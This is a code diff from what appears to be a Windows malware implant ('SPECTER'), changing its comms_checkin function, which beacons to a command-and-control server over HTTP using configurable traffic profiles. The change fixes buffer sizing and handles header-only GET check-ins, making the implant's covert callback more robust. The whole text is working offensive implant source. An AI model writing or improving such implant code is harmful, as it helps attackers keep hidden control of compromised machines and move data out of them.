@@ -1579,6 +1579,8 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         /* ============== Profile-driven path ============== */
         COMMS_TRACE("[SPECTER] checkin: profile wire path");
         PROFILE_CONFIG *prof = comms->profile;
+        DWORD method = profile_get_method(prof);
+        const char *uri = profile_get_uri(prof);
 
         /* Step 1: transform_send (heap buffer) */
         COMMS_TRACE("[SPECTER] checkin: profile transform_send");
@@ -1595,19 +1597,26 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         spec_memset(payload, 0, payload_buf_size);
         if (!NT_SUCCESS(status)) goto cleanup;
 
-        /* Step 2: profile_embed_data (heap buffer) */
-        COMMS_TRACE("[SPECTER] checkin: profile embed_data");
-        DWORD body_heap_size = 4096;
-        body_heap = (BYTE *)heap_alloc_cached(body_heap_size);
-        if (!body_heap) { status = STATUS_NO_MEMORY; goto cleanup; }
+        /* Step 2: profile_embed_data (heap buffer).
+           Header-only GET profiles carry data in profile_build_headers(),
+           so avoid manufacturing an unused body that can fail size checks. */
+        DWORD embed_body_len = 0;
+        if (method == COMMS_HTTP_POST) {
+            COMMS_TRACE("[SPECTER] checkin: profile embed_data");
+            DWORD body_heap_size = transformed_len * 2u + 512u;
+            if (body_heap_size < 4096) body_heap_size = 4096;
+            body_heap = (BYTE *)heap_alloc_cached(body_heap_size);
+            if (!body_heap) { status = STATUS_NO_MEMORY; goto cleanup; }
 
-        DWORD embed_body_len = profile_embed_data(prof, transformed, transformed_len,
-                                                   body_heap, body_heap_size);
-        if (embed_body_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
+            embed_body_len = profile_embed_data(prof, transformed, transformed_len,
+                                                body_heap, body_heap_size);
+            if (embed_body_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
+        }
 
         /* Step 3: profile_build_headers (heap buffer) */
         COMMS_TRACE("[SPECTER] checkin: profile build_headers");
-        DWORD headers_heap_size = 8192;
+        DWORD headers_heap_size = transformed_len * 2u + 2048u;
+        if (headers_heap_size < 8192) headers_heap_size = 8192;
         headers_heap = (BYTE *)heap_alloc_cached(headers_heap_size);
         if (!headers_heap) { status = STATUS_NO_MEMORY; goto cleanup; }
 
@@ -1615,13 +1624,21 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                                                    (char *)headers_heap, headers_heap_size);
         (void)headers_len;
 
-        /* Step 4: profile_get_uri */
-        COMMS_TRACE("[SPECTER] checkin: profile get_uri");
-        const char *uri = profile_get_uri(prof);
-
         /* Step 5: Build HTTP request */
         COMMS_TRACE("[SPECTER] checkin: profile build_request");
-        DWORD method = profile_get_method(prof);
+        DWORD profile_http_need = 256u +
+                                  (DWORD)spec_strlen(uri) +
+                                  (DWORD)spec_strlen(ch->url) +
+                                  headers_len;
+        if (method == COMMS_HTTP_POST && embed_body_len > 0)
+            profile_http_need += embed_body_len + 64u;
+        if (profile_http_need > http_buf_size) {
+            heap_free_cached(http_buf);
+            http_buf_size = profile_http_need + 512u;
+            http_buf = (BYTE *)heap_alloc_cached(http_buf_size);
+            if (!http_buf) { status = STATUS_NO_MEMORY; goto cleanup; }
+        }
+
         http_len = comms_http_build_request(
             method, uri, ch->url,
             ((char *)headers_heap)[0] ? (char *)headers_heap : NULL,
